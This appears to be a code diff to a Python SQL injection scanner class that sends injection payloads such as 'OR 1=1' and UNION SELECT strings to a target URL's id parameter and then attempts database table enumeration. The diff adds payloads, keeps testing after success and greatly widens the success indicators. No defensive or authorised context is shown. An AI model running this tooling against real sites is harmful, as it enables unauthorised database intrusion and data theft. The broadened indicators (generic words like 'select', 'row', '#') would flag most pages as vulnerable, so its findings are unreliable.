@@ -20,13 +20,17 @@ class SQLInjectionManager:
             "' OR '1'='1",
             "' OR 1=1 --",
             "' UNION SELECT NULL --",
-            "' AND SLEEP(5)--"
+            "' AND SLEEP(5)--",
+            "1' OR 1=1#",
+            "1' AND 1=2#"
         ]
+
 
         results = []
 
         for payload in payloads:
-            full_url = f"{target_url}:{port}/?id={payload}"
+            full_url = f"{target_url}/?id={payload}"
+
             try:
                 response = requests.get(full_url, headers=headers, timeout=timeout)
                 result = {
@@ -40,7 +44,6 @@ class SQLInjectionManager:
 
                 if self._is_vulnerable(response):
                     result["vulnerable"] = True
-                    break  # Stop after the first success
                 else:
                     result["vulnerable"] = False
 
@@ -54,12 +57,15 @@ class SQLInjectionManager:
 
         output = {
             "target": target_url,
+            "port": port,
+            "timeout": timeout,
+            "headers": headers,
             "results": results,
             "vulnerable": any(r.get("vulnerable") for r in results)
         }
 
         if output["vulnerable"] and enum_level > 0:
-            output["tables"] = self._enumerate_db(target_url, port, timeout, headers)
+            output["tables"] = self._enumerate_db(target_url, port, timeout, headers, enum_level)
             
         # Ensure output directory exists
         os.makedirs(self.output_dir, exist_ok=True)
@@ -92,14 +98,76 @@ class SQLInjectionManager:
     def _is_vulnerable(self, response):
         if response is None:
             return False
+        
         indicators = [
-            "sql syntax", "mysql", "syntax error", "unexpected token",
-            "you are logged in", "ORA-", "SQLite", "unterminated"
+            # Login / access granted
+            "you are in",
+            "login successful",
+            "welcome",
+            "you have logged in",
+            "you are logged in",
+            "admin panel",
+            "hello admin",
+            "user authenticated",
+            "access granted",
+
+            # SQL errors or warnings (common DBMS)
+            "sql syntax error",
+            "unexpected token",
+            "mysql_fetch",
+            "mysql_num_rows()",
+            "unclosed quotation mark",
+            "quoted string not properly terminated",
+            "odbc", 
+            "sqlstate",
+            "native error",
+            "syntax error",
+            "unknown column",
+            "query failed",
+            "fatal error",
+            "oracle error",
+            "incorrect syntax near",
+            "unterminated string constant",
+            "invalid sql statement",
+            "division by zero",
+            "runtime error",
+            "data type mismatch",
+
+            # Indicators of returned DB data
+            "select * from",
+            "select", "from", "where",
+            "table", "column",
+            "row", "record",
+            "id=", "user_id", "username", "password",
+            "email", "credit card", "ssn",
+
+            # Common field names
+            "first name", "last name", "surname",
+            "dob", "gender", "phone number",
+
+            # Injection-specific output
+            "' or '1'='1",
+            "' or 1=1 --",
+            "1' or 1=1 --",
+            "' union select",
+            "union select",
+            "--",
+            "#",
+            "/*",
+            
+            # Known dummy users
+            "gordon", "smith", "admin", "james", "brown",
+
+            # Backend traces
+            "error in your sql syntax",
+            "server error",
+            "internal server error",
+            "application error"
         ]
         return any(indicator.lower() in response.text.lower() for indicator in indicators)
     
     
-    def _enumerate_db(self, target_url, port, timeout, headers):
+    def _enumerate_db(self, target_url, port, timeout, headers, enum_level):
         print("[SQLInjection] Attempting table enumeration...")
 
         enum_payloads = [
@@ -110,7 +178,8 @@ class SQLInjectionManager:
         found_tables = []
 
         for payload in enum_payloads:
-            full_url = f"{target_url}:{port}/?id={payload}"
+            full_url = f"{target_url}/?id={payload}"
+
             try:
                 response = requests.get(full_url, headers=headers, timeout=timeout)
                 if response.status_code == 200:
